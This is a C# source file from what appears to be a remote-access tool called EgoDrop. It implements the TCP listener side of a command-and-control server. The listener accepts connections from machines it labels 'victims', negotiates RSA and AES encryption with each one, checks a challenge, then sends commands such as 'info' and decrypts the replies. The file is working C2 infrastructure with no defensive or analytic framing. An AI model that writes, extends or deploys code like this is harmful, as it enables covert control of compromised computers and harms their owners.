using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace EgoDrop
{
    public class clsTcpListener : clsListener
    {
        private Socket m_sktSrv { get; set; }
        public Dictionary<string, clsVictim> m_dicVictim = new Dictionary<string, clsVictim>();

        public clsTcpListener(string szName, int nPort, string szDescription)
        {
            m_szName        = szName;
            m_nPort         = nPort;
            m_szDescription = szDescription;
            m_Protocol      = clsSqlite.enListenerProtocol.TCP;
            m_stListener    = new clsSqlite.stListener(m_szName, m_Protocol, m_nPort, m_szName, DateTime.Now);

            m_sktSrv        = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }

        public override void fnStart()
        {
            if (m_bIsListening)
            {
                MessageBox.Show($"Listener[{m_szName}] is already in used.", "fnStart()", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            var hSafe = m_sktSrv.SafeHandle;
            if (m_sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
                m_sktSrv = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            m_sktSrv.SendTimeout = -1;
            m_sktSrv.ReceiveTimeout = -1;
            m_sktSrv.Bind(new IPEndPoint(IPAddress.Any, m_nPort));
            m_sktSrv.Listen(10000);

            m_bIsListening = true;

            m_sktSrv.BeginAccept(new AsyncCallback(fnBeginAcceptCallback), m_sktSrv);
        }

        public override void fnStop()
        {
            m_sktSrv?.Close();

            m_bIsListening = false;
        }

        private void fnBeginAcceptCallback(IAsyncResult ar)
        {
            if (ar == null || ar.AsyncState == null)
                return;

            Socket sktSrv = (Socket)ar.AsyncState;
            try
            {
                var hSafe = sktSrv.SafeHandle;
                if (!m_bIsListening || sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
                    return;

                sktSrv.BeginAccept(new AsyncCallback(fnBeginAcceptCallback), sktSrv);
                
                Socket sktClnt = sktSrv.EndAccept(ar);
                clsVictim victim = new clsVictim(sktClnt, this);

                fnOnNewVictim(victim);

                sktClnt.BeginReceive(
                    victim.m_abBuffer,
                    0,
                    victim.m_abBuffer.Length,
                    SocketFlags.None,
                    new AsyncCallback(fnBeginRecvCallback), victim
                );
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnBeginAcceptCallback()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void fnBeginRecvCallback(IAsyncResult ar)
        {
            if (ar == null || ar.AsyncState == null)
                return;

            clsVictim victim = (clsVictim)ar.AsyncState;
            try
            {
                Socket skt = victim.m_sktClnt;
                clsEDP edp = null;

                int nRecvLength = 0;
                byte[] abStaticRecvBuffer = new byte[clsEDP.MAX_SIZE];
                byte[] abDynamicRecvBuffer = { };

                string szB64Key = clsEZData.fnStrE2B64(victim.m_crypto.m_RSAKeyPair.szPublicKey);
                victim.fnSend(1, 0, Convert.ToBase64String(victim.m_crypto.m_abRSAKeyPair.abPublicKey));

                do
                {
                    abStaticRecvBuffer = new byte[clsEDP.MAX_SIZE];
                    nRecvLength = skt.Receive(abStaticRecvBuffer);
                    abDynamicRecvBuffer = clsTools.fnabCombineBytes(abDynamicRecvBuffer, 0, abDynamicRecvBuffer.Length, abStaticRecvBuffer, 0, nRecvLength);

                    if (nRecvLength <= 0)
                        break;
                    else if (abDynamicRecvBuffer.Length < clsEDP.HEADER_SIZE)
                        continue;
                    else
                    {
                        var headerInfo = clsEDP.fnGetHeader(abDynamicRecvBuffer);
                        while (abDynamicRecvBuffer.Length - clsEDP.HEADER_SIZE >= headerInfo.nLength)
                        {
                            edp = new clsEDP(abDynamicRecvBuffer);
                            abDynamicRecvBuffer = edp.m_abMoreData;
                            headerInfo = clsEDP.fnGetHeader(abDynamicRecvBuffer);

                            byte[] abBuffer = edp.fnGetMsg().abMsg;

                            if (edp.m_nCommand == 0)
                            {
                                if (edp.m_nParam == 0)
                                {
                                    
                                }
                            }
                            else if (edp.m_nCommand == 1)
                            {
                                if (edp.m_nParam == 1)
                                {
                                    byte[] abCipher = Convert.FromBase64String(Encoding.UTF8.GetString(abBuffer));
                                    byte[] abPlain = victim.m_crypto.fnabRSADecrypt(abCipher);
                                    string szPlain = Encoding.UTF8.GetString(abPlain);
                                    
                                    var split = szPlain.Split('|');
                                    byte[] abKey = Convert.FromBase64String(split[0]);
                                    byte[] abIV = Convert.FromBase64String(split[1]);

                                    victim.m_crypto.fnAesSetNewKeyIV(abKey, abIV);

                                    //Validate
                                    string szChallenge = clsEZData.fnGenerateRandomStr();
                                    victim.m_crypto.m_szChallenge = szChallenge;
                                    victim.fnSend(1, 2, szChallenge);
                                }
                                else if (edp.m_nParam == 3)
                                {
                                    string szb64RecvCipher = Encoding.UTF8.GetString(abBuffer);
                                    string szPlain = victim.m_crypto.fnszAESDecrypt(Convert.FromBase64String(szb64RecvCipher));

                                    if (string.Equals(victim.m_crypto.m_szChallenge, szPlain))
                                    {
                                        victim.fnSendCommand("info");
                                    }
                                }
                            }
                            else if (edp.m_nCommand == 2)
                            {
                                if (edp.m_nParam == 0)
                                {
                                    string szPlain = victim.m_crypto.fnszAESDecrypt(abBuffer);
                                    List<string> lsMsg = szPlain.Split('|').Select(x => clsEZData.fnB64D2Str(x)).ToList();

                                    fnOnReceivedMessage(victim, lsMsg);
                                }
                            }
                        }
                    }
                }
                while (nRecvLength > 0);

                fnOnVictimDisconnected(victim);
            }
            catch (Exception ex)
            {
                Socket sktClnt = victim.m_sktClnt;
                MessageBox.Show(ex.Message, "fnBeginRecvCallback()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
